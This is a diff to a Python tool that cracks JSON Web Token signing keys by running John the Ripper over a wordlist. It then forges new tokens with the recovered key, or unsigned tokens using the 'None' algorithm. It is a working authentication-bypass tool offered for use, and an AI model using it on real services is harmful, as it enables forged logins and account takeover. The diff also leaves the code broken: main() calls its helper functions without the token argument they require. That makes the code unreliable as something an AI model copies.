@@ -9,6 +9,7 @@ import string
 import subprocess as sp
 
 from argparse import ArgumentParser
+from pathlib import Path
 
 def get_random_string(length):
     letters = string.ascii_lowercase
@@ -21,6 +22,7 @@ class JWToken(object):
             self.header  = jwt.get_unverified_header(token)
             self.payload = jwt.decode(token, verify=False)
             self.encoded = token
+            self.encoded_header, self.encoded_payload, self.signature = token.split('.')
 
             # Check if token is signed
             try:
@@ -32,22 +34,33 @@ class JWToken(object):
                 self.signed = True
                 self.algo   = self.header['alg']
 
-            if key and self._is_valid(key):
-                self.key = key
+            if key:
+                self.set_key(key)
             else:
                 self.key = ''
+
         except Exception as e:
             raise e
+
+    def set_key(self, key):
+        if self._is_valid(key):
+            self.key = key
+        else:
+            print(f'Invalid key: {key}')
 
     def _is_valid(self, key):
         try:
             # Check that the key is the good one.
-            jwt.decode(self.encoded, key, algorithms=[self.algo])
+            jwt.decode(self.encoded, key)
             return True
         except:
             return False
 
     def bruteforce(self, wordlist=None):
+        '''This function uses JohnTheRipper. It must be installed and on $PATH.
+        Why to use it ? Because I'm lazy and because of it's performances!
+        '''
+
         if not self.signed or not self.algo:
             print('Token not signed. Nothing to crack...')
             return
@@ -62,6 +75,7 @@ class JWToken(object):
 
             return arg
 
+        # To get the cracked key from JTR output
         def cracked_key():
             out = sp.check_output(['john', fname, '--show', format_arg()]).decode('utf-8')
             if '0 left' in out:
@@ -69,29 +83,44 @@ class JWToken(object):
                 return out.split('\n')[0].replace('?:', '')
             return None
 
+        # Create a random file name
         fname   = f'jwt_{get_random_string(6)}.txt'
 
+        # Write token in the temporary random file
         with open(fname, 'w') as dst:
             dst.write(self.encoded)
 
+        # Create the cmd list to execute as subprocess
         cmd = ['john', fname, format_arg()]
 
         if wordlist:
             cmd.append(f'--wordlist={wordlist}')
 
+        # And run it silently
         sp.check_call(cmd, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
 
+        # Get the result, verify, and set self.key if it's good
         key = cracked_key()
         if key:
-            if self._is_valid(key):
-                self.key = key
+            self.set_key(key)
 
+        # Remove the temporary file
         sp.check_call(['rm', fname])
 
-    def forge(self, payload):
+    def forge(self, payload, algo=None):
+
+        # Ensure payload is an object.
+        if type(payload) is str:
+            payload = json.loads(payload)
+
+        # Particular case of no signing. Doesn't need a key.
+        if algo == 'None':
+            return jwt.encode(payload, None, algorithm=None).decode('utf-8')
+
+        # Any other case we need a key
         if self.key:
-            if type(payload) is str:
-                payload = json.loads(payload)
+            if algo and not algo == 'None':
+                return jwt.encode(payload, self.key, algorithm=algo).decode('utf-8')
             return jwt.encode(payload, self.key, algorithm=self.algo).decode('utf-8')
         else:
             print('Impossible to forge without key')
@@ -102,6 +131,7 @@ def main():
                             epilog='Use it at your own risk. Do not do stupid or illegal stuff. You are responsible of what you do.')
 
     parser.add_argument('token', help='The token to crack or to forge from')
+    parser.add_argument('-a', '--algorithm', help='The algorithm to use. (HS256, HS512, RS256, None)')
     parser.add_argument('-b', '--bruteforce', action='store_true',
                         help='Add this option to bruteforce the key using JohnTheRipper')
     parser.add_argument('-f', '--forge', help='JSON payload string of the new JTW to forge')
@@ -110,33 +140,61 @@ def main():
 
     args = parser.parse_args()
 
+    def get_token():
+        if args.key:
+            if os.path.exists(args.key): # If argument value is a file
+                return JWToken(args.token, key=open(args.key, 'r').read())
+            return JWToken(args.token, key=args.key)
+        return JWToken(args.token)
 
-    if args.key:
-        token = JWToken(args.token, key=args.key)
-    else:
-        token = JWToken(args.token)
-
-    if args.bruteforce:
+    def bruteforce(token):
         if args.wordlist:
-            print(f'Starting Bruteforce with John using {args.wordlist}.')
+            print(f'[*] Starting Bruteforce with John using {args.wordlist}.')
             token.bruteforce(wordlist=args.wordlist)
         else:
-            print('Starting Bruteforce with John.')
+            print('[*] Starting Bruteforce with John without wordlist.')
             token.bruteforce()
-        print('Done.')
+        if token.key:
+            print(f'[+] Key found: {token.key}')
+        else:
+            print('[-] Key not found.')
+
+    def forge(token):
+        if args.algorithm:
+            if args.algorithm in ('HS256', 'HS512', 'RS256', 'None'):
+                print('')
+                print(f'[+] New Token: {token.forge(args.forge, algo=args.algorithm)}')
+                print('')
+            else:
+                print('Algorithm is not valid. Must be one of (HS256, HS512, RS256, None).')
+                print(f'Using token\'s : {token.algo}')
+                print('')
+                print(f'[+] New Token: {token.forge(args.forge)}')
+                print('')
+        else:
+            print('')
+            print(f'[+] New Token: {token.forge(args.forge)}')
+            print('')
+
+    def show_details(token):
+        print(f'''
+        Token:     {token.encoded}
+        Payload:   {token.payload}
+        Algorithm: {token.algo}
+        Key:       {token.key}
+        ''')
+
+    token = get_token()
+
+    if not token.key and args.bruteforce:
+        bruteforce()
+
+    show_details()
 
     if args.forge:
-        print('')
-        print(f'New Token: {token.forge(args.forge)}')
-        print('')
+        forge()
 
-    print(f'''
-    Token:     {token.encoded}
-    Signed:    {token.signed}
-    Algorithm: {token.algo}
-    Key:       {token.key}
-    Payload:   {token.payload}
-    ''')
+
 
 if __name__ == '__main__':
     main()
